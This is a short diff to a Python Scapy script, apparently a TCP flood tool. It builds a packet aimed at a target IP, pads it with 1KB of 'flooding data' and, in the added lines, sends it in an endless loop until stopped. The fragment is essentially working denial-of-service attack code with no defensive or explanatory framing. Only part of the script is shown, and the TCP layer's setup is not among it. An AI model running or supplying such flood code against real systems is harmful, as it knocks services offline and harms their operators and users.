@@ -13,3 +13,8 @@ ip = IP(dst=target_ip)
 
 # add some flooding data (1KB in this case)
 raw = Raw(b"X"*1024)
+
+# stack up the layers
+p = ip / tcp / raw
+# send the constructed packet in a loop until CTRL+C is detected
+send(p, loop=1, verbose=0)
